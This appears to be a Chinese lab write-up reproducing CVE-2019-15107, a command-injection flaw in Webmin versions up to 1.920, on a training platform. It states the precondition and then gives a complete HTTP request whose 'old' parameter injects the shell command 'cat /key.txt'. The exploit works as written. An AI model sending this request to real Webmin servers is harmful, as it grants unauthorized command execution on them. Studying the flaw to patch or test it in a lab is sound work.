0x00 复现环境  
墨者学院->地址：https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe

0x01 影响版本  
webmin <= 1.920

0x02 利用条件  
需要开启密码重置功能，如下图  
![image](https://github.com/xuxuedong/yibudengtian-input-db/blob/master/000046_webmin%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-15107%EF%BC%89/0.jpeg)  
查看webmin的配置文件/etc/webmin/miniserv.conf，可以发现passwd_mode的值已经从0变为了2

0x03 利用过程  
随便发起一个请求，burp拦截，修改为如下数据包  
```
POST /password_change.cgi HTTP/1.1
Host: 219.153.49.228:41489
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://219.153.49.228:41489/passwd/index.cgi?xnavigation=1
X-PJAX: true
X-PJAX-Container: [data-dcontainer]
X-PJAX-URL: passwd/edit_passwd.cgi?user=root
X-Requested-From: passwd
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Type: text/plain;charset=UTF-8
Content-Length: 60
Connection: close

user=yibudengtian&old=cat%20/key.txt&new1=123456&new2=123456
```
